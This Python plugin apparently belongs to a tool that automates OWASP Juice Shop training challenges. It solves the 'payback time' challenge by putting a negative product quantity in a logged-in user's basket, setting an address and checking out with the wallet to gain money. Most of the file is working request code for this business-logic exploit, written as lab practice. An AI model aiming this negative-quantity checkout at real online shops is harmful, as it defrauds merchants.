# SOURCE FILE:    paybackTime.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Doing payback time challenge
#                 Set the amount of sth in your basket to be negative
#                 Gain money after checkout
#                 step1. login to user A
#                 step2. Set the quantity of sth in your basket to be -1000000
#                 setp3. Set address and checkout
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Hugh Song
#
# NOTES
#--------------------------------------------------------------------------------------

from plugins import basket as bt
#---------------------------------------------------------------------------------------
#Class: paybackTime
#Inherit: Attack
#-----------------------------------------------------------------------------------------------
class paybackTime(bt.manipulate_basket):

#-----------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#-----------------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = bt.a.requests.session()
        print("please enter your email")
        # user's email: get from command line, and it must exist in user.json)
        self.email = input()
        # user id: get through user_handle
        self.userid = bt.a.get_userId(self.email)
        # cookie and header for this user: get through user_handle
        self.cookie, self.header = bt.a.get_auth(self.email)
        # user's basket id: get through user_handle
        self.basketId = bt.a.get_basket_id(self.email)
        # url to set user's shipping address
        self.address_url = bt.a.URL + '/api/Addresss/'
        # url to checkout
        self.checkout_url = bt.a.URL + '/rest/basket/'+str(self.basketId)+'/checkout'
        # product ID: randomly add an avaliable prodect into user's basket
        self.productId = super().generate_productID(self.basketId)
        

#-----------------------------------------
#FUNCTION get_address
#ARGUMENTS: N/A
#RETURNS: addressId  --> user's shipping address ID. 
#Description: This funtions used to get user's shipping address ID
#             If the user already has shipping address --> directly get ID through user_handler
#             else invoke set_address function to set a shipping address for this user
#NOTES:
#-----------------------------------------------------------------------------------------------
    def get_address(self):
        addressId = bt.a.get_userAddressId(self.email)
        if addressId:
            return addressId
        else: 
            addressId = self.set_address()
            return addressId

#-----------------------------------------
#FUNCTION set_address
#ARGUMENTS: N/A
#RETURNS: addressId  --> user's shipping address ID. 
#Description: This funtions used to set a shipping address for this user
#             Craft a json data and send POST request to address_url
#NOTES:
#-----------------------------------------------------------------------------------------------
    def set_address(self):
        json_data = {
            'country': 'canada',
            'fullName': 'testadmin',
            'mobileNum': 123456789,
            'zipCode': '123456',
            'streetAddress': '5555 baper ave',
            'city': 'richmond',
            'state': 'BC',
        }
        response = self.juice_session.post(self.address_url, cookies=self.cookie, headers=self.header, json=json_data, verify=False)
        address_id = response.json()['data']['id']
        bt.a.set_userAddressId(self.email,address_id)
        return address_id

#-----------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: json_data  --> will be embedded into POST request json field. 
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def generator(self):
        addressId = self.get_address()
        json_data = {
            'couponData': 'bnVsbA==',
            'orderDetails': {
                'paymentId': 'wallet',
                'addressId': str(addressId),
                'deliveryMethodId': '3',
            },
        }
        return json_data

#-----------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        super().view_basket(self.basketId)
        super().addto_basket(quantity=-5, productId=self.productId)
        json_data = self.generator()
        response = self.juice_session.post(self.checkout_url, cookies=self.cookie, headers=self.header, json=json_data, verify=False)
        if response.status_code == 200:
            print("You have become richer!")

        # a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
        #                     level=a.logging.INFO, format='%(asctime)s %(message)s')
        # logger = a.logging.getLogger("Payback Time")
        # a.logging.info(logger)
        # a.logging.info('Started')
        # self.forged_feedback()
        # self.forged_review()
        # a.logging.info('Finished')
